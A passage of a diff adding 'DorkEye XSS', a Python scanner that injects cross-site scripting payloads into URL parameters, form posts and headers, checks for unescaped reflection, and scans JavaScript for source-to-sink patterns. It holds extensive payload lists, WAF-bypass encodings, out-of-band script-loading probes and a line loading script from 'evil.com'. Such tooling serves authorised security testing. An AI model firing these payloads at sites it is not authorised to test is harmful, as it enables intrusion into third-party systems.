@@ -1,0 +1,1610 @@
+"""
+DorkEye XSS  v5.3
+═══════════════════════════════════════════════════════════════
+Multi-method XSS testing engine for DorkEye Project
+
+Detection methods:
+  1. reflected  — inject payloads into GET params; check for unescaped reflection
+  2. stored     — POST payload per individual param, then refetch and check for marker
+  3. dom        — static analysis of JS source-to-sink patterns (inline + external scripts)
+  4. header     — inject marker into X-Forwarded-For / Referer / User-Agent / etc.
+
+Changes vs v5.2:
+  [NEW-A]  _FallbackFingerprintRotator: User-Agent pool now loaded from
+           http_fingerprints.json via sqli.load_http_fingerprints() (22 real-browser
+           UAs covering Chrome/Firefox/Safari/Edge/Opera/Brave on all platforms).
+           Hardcoded 3-entry list is now the emergency fallback only.
+  [NEW-B]  XSSDetector.__init__: new optional parameter waf_detected (str|None).
+           When DorkEye pipeline pre-probes WAF with probe_waf() and passes the
+           result here, every _test_* method skips immediately instead of running
+           a redundant per-method WAF detection request. Internal _detect_waf()
+           is kept as a fallback for standalone/CLI use only.
+  [NEW-C]  WAF early-return added to _test_reflected, _test_stored, _test_dom,
+           _test_header_xss — avoids wasted HTTP requests against blocked targets.
+
+Changes vs v5.1 (carried from v5.2):
+  [FIX-1..8]  False-positive fixes (see v5.2 changelog for details).
+
+  [FIX-9]  _test_dom: inline_scripts regex updated from
+           r"<script[^>]*>([\s\S]*?)</script>" to
+           r"<script[^>]*>([\s\S]*?)</script\s*>"
+           Fixes CodeQL alert #27 (py/bad-tag-filter, CWE-20/116/185/186):
+           the original pattern did not match closing tags with whitespace
+           before '>' (e.g. </script >), allowing potential bypass in
+           filtering/extraction contexts. Severity: High.
+
+  Author: xPloits3c I.C.W.T | https://github.com/xPloits3c/DorkEye
+"""
+
+import re
+import time
+import random
+import difflib
+import threading
+from enum import Enum
+from typing import Dict, List, Optional, Tuple
+from urllib.parse import urlparse, parse_qs, urlencode
+
+import requests
+import urllib3
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+
+# ── [NEW-9] Granular per-symbol import with individual fallbacks ──────────────
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+_SHARED_IMPORTS = False
+
+try:
+    from sqli import HTTPFingerprintRotator as _SqliRotator
+    _HAS_ROTATOR = True
+except ImportError:
+    _HAS_ROTATOR = False
+
+try:
+    from sqli import CircuitBreaker as _SqliCircuitBreaker
+    _HAS_CIRCUIT = True
+except ImportError:
+    _HAS_CIRCUIT = False
+
+try:
+    from sqli import WAF_SIGNATURES as _SqliWafSigs
+    _HAS_WAF_SIGS = True
+except ImportError:
+    _HAS_WAF_SIGS = False
+
+try:
+    from sqli import _interruptible_sleep as _sqli_sleep
+    _HAS_SLEEP = True
+except ImportError:
+    _HAS_SLEEP = False
+
+try:
+    import sqli as _sqli_module
+    _SHARED_IMPORTS = True
+except ImportError:
+    _sqli_module = None
+
+# [NEW-A] Load the full http_fingerprints.json UA pool via sqli helper.
+# Imported separately so it works even when the heavier sqli classes are absent.
+try:
+    from sqli import load_http_fingerprints as _load_http_fingerprints
+    _HAS_FP_LOADER = True
+except ImportError:
+    _HAS_FP_LOADER = False
+
+
+def _load_xss_ua_pool() -> List[str]:
+    """
+    Extract all User-Agent strings from http_fingerprints.json.
+    Called once at module import; result cached in _FP_UA_POOL.
+
+    Uses sqli.load_http_fingerprints() so the JSON path resolution is shared
+    between sqli.py and xss.py — no path duplication.
+    Returns an empty list if the file is missing or malformed (hardcoded fallback kicks in).
+    """
+    if not _HAS_FP_LOADER:
+        return []
+    try:
+        data = _load_http_fingerprints()
+        if data.get("_mode") == "disabled":
+            return []
+        agents: List[str] = []
+        for fp_entry in data.get("fingerprints", {}).values():
+            ua = fp_entry.get("user_agent", "")
+            if ua and ua not in agents:
+                agents.append(ua)
+        return agents
+    except Exception:
+        return []
+
+
+# Populated once at import — all XSSDetector instances share this pool
+_FP_UA_POOL: List[str] = _load_xss_ua_pool()
+
+# ── Interrupt flags ───────────────────────────────────────────────────────────
+_exit_requested: bool = False
+_skip_current:   bool = False
+
+_CONNECT_TIMEOUT = 4
+_DEFAULT_READ    = 8
+
+
+def _get_exit_flag() -> bool:
+    if _exit_requested:
+        return True
+    if _sqli_module is not None:
+        return _sqli_module._exit_requested
+    return False
+
+
+def _get_skip_flag() -> bool:
+    if _skip_current:
+        return True
+    if _sqli_module is not None:
+        return _sqli_module._skip_current
+    return False
+
+
+def _safe_sleep(seconds: float) -> None:
+    if _HAS_SLEEP:
+        _sqli_sleep(seconds)
+    else:
+        elapsed = 0.0
+        step    = 0.25
+        while elapsed < seconds:
+            if _get_exit_flag() or _get_skip_flag():
+                return
+            time.sleep(min(step, seconds - elapsed))
+            elapsed += step
+
+
+# ── Fallback WAF_SIGNATURES ───────────────────────────────────────────────────
+_WAF_SIGNATURES_FALLBACK: Dict[str, List[str]] = {
+    "cloudflare":  ["cf-ray", "__cfduid", "cloudflare", "attention required! | cloudflare"],
+    "modsecurity": ["mod_security", "modsecurity", "406 not acceptable", "not acceptable!"],
+    "wordfence":   ["wordfence", "generated by wordfence"],
+    "sucuri":      ["x-sucuri-id", "sucuri website firewall", "access denied - sucuri"],
+    "imperva":     ["x-iinfo", "incapsula incident", "*incap_ses*"],
+    "akamai":      ["akamai", "x-akamai-transformed", "reference #18"],
+    "f5_bigip":    ["x-waf-event-info", "bigipserver", "the requested url was rejected"],
+    "barracuda":   ["barra_counter_session", "barracuda"],
+    "fortiweb":    ["fortigate", "fortiweb"],
+    "aws_waf":     ["x-amzn-requestid", "awselb", "forbidden - aws waf"],
+    "denyall":     ["denyall", "x-denyall"],
+    "reblaze":     ["x-reblaze-protection"],
+}
+
+_ACTIVE_WAF_SIGS = _SqliWafSigs if _HAS_WAF_SIGS else _WAF_SIGNATURES_FALLBACK
+
+
+# ══════════════════════════════════════════════════════════════
+#  XSSConfidence
+# ══════════════════════════════════════════════════════════════
+
+class XSSConfidence(Enum):
+    NONE     = "none"
+    LOW      = "low"
+    MEDIUM   = "medium"
+    HIGH     = "high"
+    CRITICAL = "critical"
+
+
+_CONF_RANK = {
+    XSSConfidence.CRITICAL.value: 4,
+    XSSConfidence.HIGH.value:     3,
+    XSSConfidence.MEDIUM.value:   2,
+    XSSConfidence.LOW.value:      1,
+    XSSConfidence.NONE.value:     0,
+}
+
+
+# ══════════════════════════════════════════════════════════════
+#  Parameter priority tables
+# ══════════════════════════════════════════════════════════════
+
+_XSS_HIGH_PRIORITY: frozenset = frozenset({
+    "q", "query", "search", "s", "keyword", "kw", "term", "find",
+    "name", "user", "username", "message", "msg", "comment", "text",
+    "input", "value", "data", "content", "body", "title", "description",
+    "subject", "note", "info",
+    "redirect", "url", "next", "return", "callback", "ref", "goto",
+    "redir", "dest", "target", "location",
+})
+
+_XSS_MEDIUM_PRIORITY: frozenset = frozenset({
+    "id", "page", "cat", "category", "type", "lang", "language",
+    "filter", "tag", "label", "topic", "section", "email", "mail",
+    "first", "last", "city", "country", "region",
+})
+
+_PRIVATE_IP_RE = re.compile(
+    r"^(?:"
+    r"10\."
+    r"|172\.(?:1[6-9]|2\d|3[01])\."
+    r"|192\.168\."
+    r"|169\.254\."
+    r"|127\."
+    r"|::1$"
+    r"|fc[0-9a-f]{2}:"
+    r")"
+)
+
+
+# ══════════════════════════════════════════════════════════════
+#  Fallback CircuitBreaker
+# ══════════════════════════════════════════════════════════════
+
+class _FallbackCircuitBreaker:
+    def __init__(self):
+        self._dead: set = set()
+
+    def _key(self, url: str) -> str:
+        p = urlparse(url)
+        return f"{p.scheme}://{p.netloc}"
+
+    def is_dead(self, url: str) -> bool:
+        return self._key(url) in self._dead
+
+    def mark_dead(self, url: str) -> None:
+        self._dead.add(self._key(url))
+
+    def reset(self) -> None:
+        self._dead.clear()
+
+
+# ══════════════════════════════════════════════════════════════
+#  Fallback HTTPFingerprintRotator
+# ══════════════════════════════════════════════════════════════
+
+class _FallbackFingerprintRotator:
+    """
+    Minimal rotator used when sqli.HTTPFingerprintRotator cannot be imported.
+
+    User-Agent priority:
+      1. _FP_UA_POOL  — 22 real-browser UAs from http_fingerprints.json  [NEW-A]
+      2. _HARDCODED_AGENTS — 3-entry emergency fallback (no JSON file present)
+    """
+
+    _HARDCODED_AGENTS: List[str] = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+        "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/605.1.15 "
+        "(KHTML, like Gecko) Version/18.2 Safari/605.1.15",
+    ]
+
+    @property
+    def _agents(self) -> List[str]:
+        """Return the fingerprint-file pool if loaded, else the hardcoded emergency list."""
+        return _FP_UA_POOL if _FP_UA_POOL else self._HARDCODED_AGENTS
+
+    def get_random(self) -> None:
+        self._ua: str = random.choice(self._agents)
+
+    def get_next(self) -> None:
+        self.get_random()
+
+    def build_headers(self, referer: str = "") -> Dict[str, str]:
+        ua = getattr(self, "_ua", self._agents[0])
+        headers = {
+            "User-Agent":      ua,
+            "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection":      "keep-alive",
+        }
+        if referer:
+            headers["Referer"] = referer
+        return headers
+
+
+# ══════════════════════════════════════════════════════════════
+#  XSSDetector
+# ══════════════════════════════════════════════════════════════
+
+class XSSDetector:
+    """
+    Multi-method XSS detector for DorkEye.
+
+    Detection methods (run in order per request):
+      1. reflected  — GET param injection + unescaped-reflection check
+      2. stored     — per-param POST injection, refetch via GET, check for marker
+      3. dom        — static JS source-to-sink analysis (inline + external scripts)
+      4. header     — inject marker into reflected HTTP request headers
+    """
+
+    _MARKER = "DEXSS7x"
+
+    # ── Reflected payloads ────────────────────────────────────────────────────
+    _REFLECTED_PAYLOADS: List[str] = [
+        "<script>alert('DEXSS7x')</script>",
+        '"><script>alert("DEXSS7x")</script>',
+        "'><script>alert('DEXSS7x')</script>",
+        "<script>alert`DEXSS7x`</script>",
+        "<script type='text/javascript'>alert('DEXSS7x')</script>",
+        '<img src=x onerror=alert("DEXSS7x")>',
+        '"><img src=x onerror=alert("DEXSS7x")>',
+        "<video src=x onerror=alert('DEXSS7x')>",
+        "<audio src=x onerror=alert('DEXSS7x')>",
+        "<source src=x onerror=alert('DEXSS7x')>",
+        "<svg/onload=alert('DEXSS7x')>",
+        '"><svg onload=alert("DEXSS7x")>',
+        "<svg><script>alert('DEXSS7x')</script></svg>",
+        "<svg><animate onbegin=alert('DEXSS7x') attributeName=x dur=1s>",
+        "<math><mtext></mtext><script>alert('DEXSS7x')</script></math>",
+        "<input autofocus onfocus=alert('DEXSS7x')>",
+        "<select autofocus onfocus=alert('DEXSS7x')>",
+        "<textarea autofocus onfocus=alert('DEXSS7x')>",
+        "<details open ontoggle=alert('DEXSS7x')>",
+        '<body onload=alert("DEXSS7x")>',
+        '<iframe srcdoc="<script>alert(\'DEXSS7x\')</script>">',
+        "<form><button formaction=javascript:alert('DEXSS7x')>X</button></form>",
+        '" onmouseover="alert(\'DEXSS7x\')" x="',
+        "' onmouseover='alert(\"DEXSS7x\")' x='",
+        '" onfocus="alert(\'DEXSS7x\')" autofocus="',
+        "<a href=javascript:alert('DEXSS7x')>click</a>",
+        "';alert('DEXSS7x')//",
+        '";alert("DEXSS7x")//',
+        "`<script>alert('DEXSS7x')</script>`",
+        "${alert('DEXSS7x')}",
+        "{{constructor.constructor('alert(\"DEXSS7x\")')()}}",
+        "#{alert('DEXSS7x')}",
+        "<noscript><p title=\"</noscript><img src=x onerror=alert('DEXSS7x')\">",
+        "<listing><img src=\"</listing><img src=x onerror=alert('DEXSS7x')\">",
+        "<link rel=stylesheet href=javascript:alert('DEXSS7x')>",
+        (
+            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('DEXSS7x') )//"
+            "%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>"
+            "\\x3csVg/<sVg/oNloAd=alert('DEXSS7x')//\\x3e"
+        ),
+        "<script>Object.prototype.x=alert('DEXSS7x')</script>",
+        "<noscript><img src=x onerror=alert('DEXSS7x')></noscript>",
+        "<base href=//evil.com/><script src=/x.js></script>",
+        "<meta http-equiv=refresh content='0;url=javascript:alert(\"DEXSS7x\")'>",
+        "<object data=javascript:alert('DEXSS7x')>",
+        "<embed src=javascript:alert('DEXSS7x')>",
+        "<div tabindex=1 onfocus=alert('DEXSS7x') id=x></div><script>x.focus()</script>",
+        '<iframe srcdoc="&lt;img src=x onerror=alert(1)&gt;" sandbox="allow-scripts">',
+    ]
+
+    # ── WAF-bypass encoding variants ──────────────────────────────────────────
+    _BYPASS_PAYLOADS: List[str] = [
+        "<ScRiPt>alert('DEXSS7x')</sCrIpT>",
+        "<iMg src=x oNeRrOr=alert('DEXSS7x')>",
+        "<svg/onload=&#97;lert('DEXSS7x')>",
+        "&#60;script&#62;alert('DEXSS7x')&#60;/script&#62;",
+        "\\u003Cscript\\u003Ealert('DEXSS7x')\\u003C/script\\u003E",
+        "%3Cscript%3Ealert('DEXSS7x')%3C/script%3E",
+        "%3Cimg+src%3Dx+onerror%3Dalert('DEXSS7x')%3E",
+        "%253Cscript%253Ealert('DEXSS7x')%253C/script%253E",
+        "<scr<!---->ipt>alert('DEXSS7x')</scr<!---->ipt>",
+        "<img src=x o/**/nerror=alert('DEXSS7x')>",
+        "<img\tsrc=x\tonerror=alert('DEXSS7x')>",
+        "<img\nsrc=x\nonerror=alert('DEXSS7x')>",
+        "<img src=`x` onerror=`alert('DEXSS7x')`>",
+        "<iframe src=\"data:text/html,<script>alert('DEXSS7x')</script>\">",
+        "<svg><image href=\"data:,\" onerror=alert('DEXSS7x')>",
+        "<div style=\"width:expression(alert('DEXSS7x'))\">",
+        "<scr\x00ipt>alert('DEXSS7x')</scr\x00ipt>",
+        "<img\x00src=x onerror=alert('DEXSS7x')>",
+        "<script>void(alert('DEXSS7x'))</script>",
+        "<img src=x onerror=void(alert('DEXSS7x'))>",
+        "<svg xmlns='http://www.w3.org/2000/svg' onload=alert('DEXSS7x')/>",
+        "<form action=javascript:alert('DEXSS7x')><button>X</button></form>",
+        "<input type=image src=x onerror=alert('DEXSS7x')>",
+        "<!--<script>alert('DEXSS7x')</script>-->",
+        "/%2F..%2F..%2Fevil.js",
+        '<script charset="x-mac-farsi">\xd0)</script>',
+    ]
+
+    _STORED_PAYLOADS: List[str] = [
+        "<script>alert('DEXSS7x')</script>",
+        '<img src=x onerror=alert("DEXSS7x")>',
+        "<svg/onload=alert('DEXSS7x')>",
+        "<input autofocus onfocus=alert('DEXSS7x')>",
+        "<details open ontoggle=alert('DEXSS7x')>",
+    ]
+
+    # ── DOM sources ───────────────────────────────────────────────────────────
+    _DOM_SOURCES: List[str] = [
+        r"location\.hash",
+        r"location\.search",
+        r"location\.href",
+        r"document\.URL",
+        r"document\.documentURI",
+        r"document\.referrer",
+        r"window\.name",
+        r"history\.state",
+        r"localStorage\.getItem",
+        r"sessionStorage\.getItem",
+        r"postMessage",
+        r"XMLHttpRequest\.responseText",
+        r"fetch\s*\(",
+        r"document\.cookie",
+        r"\.getAttribute\s*\(",
+        r"WebSocket",
+    ]
+
+    # ── DOM sinks ─────────────────────────────────────────────────────────────
+    _DOM_SINKS: List[str] = [
+        r"document\.write\s*\(",
+        r"document\.writeln\s*\(",
+        r"\.innerHTML\s*=",
+        r"\.outerHTML\s*=",
+        r"\beval\s*\(",
+        r"setTimeout\s*\(\s*['\"]",
+        r"setInterval\s*\(\s*['\"]",
+        r"location\.href\s*=",
+        r"location\.assign\s*\(",
+        r"location\.replace\s*\(",
+        r"insertAdjacentHTML\s*\(",
+        r'\.setAttribute\s*\(\s*[\'"](?:src|href|on\w+)[\'"]',
+        r"document\.createElement\s*\(\s*['\"]script['\"]",
+        r"\.src\s*=\s*(?:location|window)",
+        r"\.createContextualFragment\s*\(",
+        r"DOMParser",
+        r"window\.open\s*\(",
+        r"importScripts\s*\(",
+        r"\.href\s*=",
+        r"\.action\s*=",
+        r"\.srcdoc\s*=",
+    ]
+
+    # ── [FIX-6] Greatly expanded DOM safe-pattern list ────────────────────────
+    # Any JS line matching one of these patterns is excluded from source/sink
+    # analysis.  The original list was too narrow, causing every React/Vue/Angular
+    # SPA to produce at least one source-sink pair.
+    _DOM_SAFE_PATTERNS: List[str] = [
+        # --- Analytics / tracking ---
+        r"//.*(?:analytics|tracking|google-analytics|gtag|ga\()",
+
+        # --- Static string assignments (not user-controlled) ---
+        r"document\.write\s*\(\s*['\"]",
+        r"innerHTML\s*=\s*['\"]",
+
+        # --- Code comments ---
+        r"//\s*(?:TODO|FIXME|NOTE|eslint|@)",
+        r"/\*[\s\S]*?\*/",
+
+        # --- React / JSX internals ---
+        r"(?:__html|dangerouslySetInnerHTML)",   # explicit React escape hatch (still FP-prone)
+        r"React\.(createElement|render|hydrate)",
+        r"ReactDOM\.(render|hydrate|createPortal)",
+        r"_react(?:Dom)?(?:\.|\.default\.)",
+
+        # --- Vue.js internals ---
+        r"Vue\.(set|delete|nextTick|component|directive|mixin|use)",
+        r"\$(?:set|delete|emit|nextTick|watch|mount|forceUpdate)",
+        r"createApp|defineComponent|ref\s*\(|reactive\s*\(",
+
+        # --- Angular internals ---
+        r"NgModule|Injectable|Component\s*\(",
+        r"DomSanitizer|bypassSecurityTrust",
+        r"Renderer2|ElementRef",
+
+        # --- jQuery patterns (common, usually not user-controlled sources) ---
+        r"\$\(document\)\.ready",
+        r"\.on\s*\(\s*['\"](?:click|submit|change|keyup|keydown|load|ready)",
+        r"jQuery\.(?:ajax|get|post|getJSON|load)",
+
+        # --- Webpack / bundle artifacts ---
+        r"__webpack_require__|webpackJsonp|__esModule",
+        r"define\.amd|requirejs|System\.register",
+        r"exports\.\w+\s*=|module\.exports\s*=",
+        r"Object\.defineProperty\s*\(\s*exports",
+
+        # --- Safe reads into local variables (not piped to a sink on same line) ---
+        r"(?:var|let|const)\s+\w+\s*=\s*document\.cookie",
+        r"(?:var|let|const)\s+\w+\s*=\s*localStorage\.getItem",
+        r"(?:var|let|const)\s+\w+\s*=\s*sessionStorage\.getItem",
+        r"(?:var|let|const)\s+\w+\s*=\s*location\.hash",
+        r"(?:var|let|const)\s+\w+\s*=\s*location\.search",
+
+        # --- Safe window.open (opening http/https URLs, not javascript:) ---
+        r"window\.open\s*\(\s*['\"]https?://",
+        r"window\.open\s*\(\s*url\b",   # common pattern: window.open(url, '_blank')
+
+        # --- Safe href/action assignments to static URLs ---
+        r"\.href\s*=\s*['\"]https?://",
+        r"\.href\s*=\s*['\"]#",
+        r"\.href\s*=\s*['\"]mailto:",
+        r"\.action\s*=\s*['\"]https?://",
+        r"\.action\s*=\s*['\"][/#]",
+
+        # --- DOMParser used for XML/SVG only (not text/html) ---
+        r"parseFromString\s*\([^,]+,\s*['\"](?:text/xml|application/xml|image/svg\+xml)['\"]",
+
+        # --- fetch() piped only into JSON parsing, not DOM ---
+        r"\.json\s*\(\s*\)|\.text\s*\(\s*\)(?!.*innerHTML)",
+        r"fetch\s*\([^)]+\)\.then\s*\([^)]+\.json\b",
+
+        # --- Lodash / Underscore / utility libs ---
+        r"_\.(?:map|filter|reduce|each|find|template|escape|unescape)\s*\(",
+        r"(?:lodash|underscore)\.",
+
+        # --- Service workers / importScripts with static URLs ---
+        r"importScripts\s*\(\s*['\"]https?://",
+        r"importScripts\s*\(\s*['\"][^'\"]+\.js['\"]",
+
+        # --- Polymer / Web components ---
+        r"customElements\.define|HTMLElement|connectedCallback|disconnectedCallback",
+
+        # --- Common innocuous patterns ---
+        r"history\.(?:pushState|replaceState)\s*\(",   # history API, not XSS
+        r"addEventListener\s*\(\s*['\"](?:message|storage)['\"]",  # listener, not execution
+    ]
+
+    _ENCODED_MARKERS: List[str] = [
+        "&lt;script",
+        "&lt;img",
+        "&lt;svg",
+        "&lt;iframe",
+        "&lt;details",
+        "&lt;body",
+        "&lt;input",
+        "&lt;video",
+        "&lt;audio",
+        "&#60;",
+        "&#x3c;",
+        "%3Cscript",
+        "\\u003C",
+        "&amp;lt;",
+        "\\x3c",
+    ]
+
+    _NON_HTML_CONTENT_TYPES: Tuple[str, ...] = (
+        "application/json",
+        "application/xml",
+        "text/xml",
+        "text/plain",
+        "application/javascript",
+        "text/csv",
+        "application/octet-stream",
+    )
+
+    _HEADER_INJECTION_TARGETS: List[str] = [
+        "X-Forwarded-For",
+        "Referer",
+        "User-Agent",
+        "X-Forwarded-Host",
+        "X-Original-URL",
+    ]
+
+    # [FIX-7] Removed bare-text probes ('DEXSS7x', "DEXSS7x", DEXSS7x<br>,
+    # javascript:alert(...)) that are not executable HTML structures.
+    # Bare text reflection is NOT XSS regardless of where it appears.
+    _HEADER_PAYLOADS: List[str] = [
+        "<script>alert('DEXSS7x')</script>",
+        "<img src=x onerror=alert('DEXSS7x')>",
+        "<svg/onload=alert('DEXSS7x')>",
+        '"><img src=x onerror=alert("DEXSS7x")>',
+    ]
+
+    _MAX_EXTERNAL_SCRIPT_BYTES: int = 512_000
+    _PROBE_SAMPLE_BYTES: int        = 8_192
+
+    # ── Window size used for structural checks around the marker ──────────────
+    # [FIX-1] All _payload_structure_present checks are now confined to this
+    # window.  Scanning the full body led to FPs every time the page happened
+    # to contain a <script> tag (analytics, CDN, etc.) that was unrelated to
+    # the injected payload.
+    _STRUCTURE_WINDOW = 300  # chars on each side of the marker position
+
+    def __init__(
+        self,
+        stealth:      bool          = False,
+        timeout:      int           = _DEFAULT_READ,
+        xss_type:     str           = "all",
+        oob_url:      Optional[str] = None,
+        waf_detected: Optional[str] = None,
+    ):
+        """
+        Initialise the XSS detector.
+
+        Args:
+            stealth:      Add extra delays between requests.
+            timeout:      Read timeout in seconds.
+            xss_type:     One of "reflected", "stored", "dom", "header", "all".
+            oob_url:      Callback URL for blind/OOB XSS payloads.
+            waf_detected: WAF name pre-detected by DorkEye's probe_waf().  [NEW-B]
+                          When set, every _test_* method returns immediately
+                          instead of running — avoids redundant requests against
+                          targets that are already known to be WAF-protected.
+                          Internal _detect_waf() is still used as a fallback
+                          when XSSDetector is run standalone (waf_detected=None).
+        """
+        self.stealth          = stealth
+        self.read_timeout     = timeout
+        self.xss_type         = xss_type
+        self.oob_url          = oob_url
+
+        # [NEW-B] WAF override — set by DorkEye pipeline, skips per-method WAF probes
+        self._waf_override: Optional[str] = waf_detected
+
+        self.circuit_breaker     = (
+            _SqliCircuitBreaker() if _HAS_CIRCUIT else _FallbackCircuitBreaker()
+        )
+        self.fingerprint_rotator = (
+            _SqliRotator() if _HAS_ROTATOR else _FallbackFingerprintRotator()
+        )
+
+        self._session   = self._build_session()
+        self._status_cb = None
+
+        self._oob_payloads: List[str] = []
+        if oob_url:
+            self._oob_payloads = [
+                f"<script src=\"//{oob_url}/{self._MARKER}\"></script>",
+                f"<img src=\"//{oob_url}/{self._MARKER}\">",
+                f"'\"><script src=\"//{oob_url}/{self._MARKER}\"></script>",
+            ]
+
+    def _cb(self, msg: str) -> None:
+        if callable(self._status_cb):
+            try:
+                self._status_cb(msg)
+            except Exception:
+                pass
+
+    # ──────────────────────────────────────────────────────────────────────────
+    #  Session
+    # ──────────────────────────────────────────────────────────────────────────
+
+    def _build_session(self) -> requests.Session:
+        session = requests.Session()
+        retry   = Retry(
+            total            = 2,
+            backoff_factor   = 0.5,
+            status_forcelist = [429, 500, 502, 503, 504],
+            allowed_methods  = ["GET", "POST"],
+            raise_on_status  = False,
+        )
+        adapter = HTTPAdapter(max_retries=retry)
+        session.mount("http://",  adapter)
+        session.mount("https://", adapter)
+        return session
+
+    def _timeout(self, extra: float = 0) -> Tuple[int, float]:
+        return (_CONNECT_TIMEOUT, self.read_timeout + extra)
+
+    # ──────────────────────────────────────────────────────────────────────────
+    #  HTTP helpers
+    # ──────────────────────────────────────────────────────────────────────────
+
+    def _run_interruptible(self, fn, total_timeout: float, on_connect_error=None):
+        _POLL         = 0.1
+        result_holder = [None]
+        exc_holder    = [None]
+        done_event    = threading.Event()
+
+        def _worker():
+            try:
+                result_holder[0] = fn()
+            except (requests.exceptions.ConnectTimeout,
+                    requests.exceptions.ConnectionError) as exc:
+                exc_holder[0] = exc
+            except Exception:
+                pass
+            finally:
+                done_event.set()
+
+        threading.Thread(target=_worker, daemon=True).start()
+
+        deadline = total_timeout + 1.0
+        elapsed  = 0.0
+        while elapsed < deadline:
+            if _get_exit_flag() or _get_skip_flag():
+                return None
+            if done_event.wait(timeout=_POLL):
+                if exc_holder[0] is not None and on_connect_error:
+                    on_connect_error()
+                return result_holder[0]
+            elapsed += _POLL
+
+        return None
+
+    def _get(
+        self,
+        url: str,
+        extra_read: float = 0,
+        extra_headers: Optional[Dict[str, str]] = None,
+    ) -> Optional[requests.Response]:
+        if self.circuit_breaker.is_dead(url):
+            return None
+
+        self.fingerprint_rotator.get_random()
+        headers = self.fingerprint_rotator.build_headers()
+
+        if extra_headers:
+            headers.update(extra_headers)
+
+        timeout = self._timeout(extra_read)
+
+        def _do():
+            return self._session.get(
+                url,
+                headers         = headers,
+                timeout         = timeout,
+                verify          = False,
+                allow_redirects = True,
+            )
+
+        total = _CONNECT_TIMEOUT + self.read_timeout + extra_read
+        return self._run_interruptible(
+            _do,
+            total_timeout    = total,
+            on_connect_error = lambda: self.circuit_breaker.mark_dead(url),
+        )
+
+    def _post(self, url: str, data: Dict) -> Optional[requests.Response]:
+        if self.circuit_breaker.is_dead(url):
+            return None
+
+        self.fingerprint_rotator.get_random()
+        headers = self.fingerprint_rotator.build_headers()
+        headers["Content-Type"] = "application/x-www-form-urlencoded"
+
+        timeout = self._timeout()
+
+        def _do():
+            return self._session.post(
+                url,
+                data            = data,
+                headers         = headers,
+                timeout         = timeout,
+                verify          = False,
+                allow_redirects = True,
+            )
+
+        total = _CONNECT_TIMEOUT + self.read_timeout
+        return self._run_interruptible(
+            _do,
+            total_timeout    = total,
+            on_connect_error = lambda: self.circuit_breaker.mark_dead(url),
+        )
+
+    # ──────────────────────────────────────────────────────────────────────────
+    #  Utilities
+    # ──────────────────────────────────────────────────────────────────────────
+
+    def _extract_params(self, url: str) -> Dict[str, str]:
+        try:
+            params = parse_qs(urlparse(url).query)
+            return {k: (v[0] if isinstance(v, list) else v) for k, v in params.items()}
+        except Exception:
+            return {}
+
+    def _inject_param(self, url: str, param: str, payload: str) -> str:
+        parsed = urlparse(url)
+        params = parse_qs(parsed.query)
+        if param not in params:
+            return url
+        params[param] = [payload]
+        new_query = urlencode(params, doseq=True)
+        rebuilt   = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
+        if parsed.fragment:
+            rebuilt += f"#{parsed.fragment}"
+        return rebuilt
+
+    def _prioritize_params(self, params: Dict[str, str]) -> List[str]:
+        high, medium, low = [], [], []
+        for param in params:
+            p_lower = param.lower()
+            if p_lower in _XSS_HIGH_PRIORITY:
+                high.append(param)
+            elif p_lower in _XSS_MEDIUM_PRIORITY:
+                medium.append(param)
+            else:
+                low.append(param)
+        return high + medium + low
+
+    # ──────────────────────────────────────────────────────────────────────────
+    #  Content-type helper
+    # ──────────────────────────────────────────────────────────────────────────
+
+    def _is_response_html(self, response: requests.Response) -> bool:
+        ct = response.headers.get("Content-Type", "").lower().split(";")[0].strip()
+        if not ct:
+            return True
+        for non_html in self._NON_HTML_CONTENT_TYPES:
+            if ct == non_html or ct.startswith(non_html):
+                return False
+        return "html" in ct or "xhtml" in ct
+
+    # ──────────────────────────────────────────────────────────────────────────
+    #  SSRF guard
+    # ──────────────────────────────────────────────────────────────────────────
+
+    def _is_safe_external_url(self, src: str) -> bool:
+        try:
+            src_stripped = src.strip()
+            scheme = src_stripped.split(":")[0].lower()
+            if scheme in ("data", "file", "javascript"):
+                return False
+            if src_stripped.startswith("//"):
+                parsed = urlparse("https:" + src_stripped)
+            else:
+                parsed = urlparse(src_stripped)
+            host = (parsed.hostname or "").lower().strip()
+            if not host:
+                return False
+            if "." not in host and ":" not in host:
+                return False
+            if _PRIVATE_IP_RE.match(host):
+                return False
+            return True
+        except Exception:
+            return False
+
+    # ──────────────────────────────────────────────────────────────────────────
+    #  Reflection check
+    # ──────────────────────────────────────────────────────────────────────────
+
+    def _is_reflected_unescaped(self, body: str, payload: str) -> bool:
+        """
+        Return True if the payload marker appears in body unescaped AND the
+        dangerous tag/structure from the payload is also present near the marker.
+
+        [FIX-4] Added "tag-stripped" guard: if the payload contains '<' but no
+        '<' is found within ±120 chars of the marker, the injection was stripped
+        (not just encoded) — return False to prevent FPs on sites that show the
+        text content of stripped tags in error messages.
+        """
+        if self._MARKER not in body:
+            return False
+
+        payload_has_tag = "<" in payload
+
+        start = 0
+        while True:
+            marker_idx = body.find(self._MARKER, start)
+            if marker_idx == -1:
+                break
+
+            ctx_start = max(0, marker_idx - 60)
+            ctx_end   = marker_idx + len(self._MARKER) + 60
+            context   = body[ctx_start:ctx_end]
+
+            # Reject HTML-encoded reflection
+            if any(enc.lower() in context.lower() for enc in self._ENCODED_MARKERS):
+                start = marker_idx + 1
+                continue
+
+            # Reject reflection inside unclosed HTML comment
+            comment_open = body.rfind("<!--", 0, marker_idx)
+            if comment_open != -1:
+                closing_before = body.find("-->", comment_open, marker_idx)
+                if closing_before == -1:
+                    closing_after = body.find("-->", marker_idx)
+                    if closing_after != -1:
+                        start = marker_idx + 1
+                        continue
+
+            # Reject when marker is inside a <script> block with Unicode escaping
+            script_open  = body.rfind("<script", 0, marker_idx)
+            script_close = body.find("</script>", marker_idx)
+            if script_open != -1 and script_close != -1:
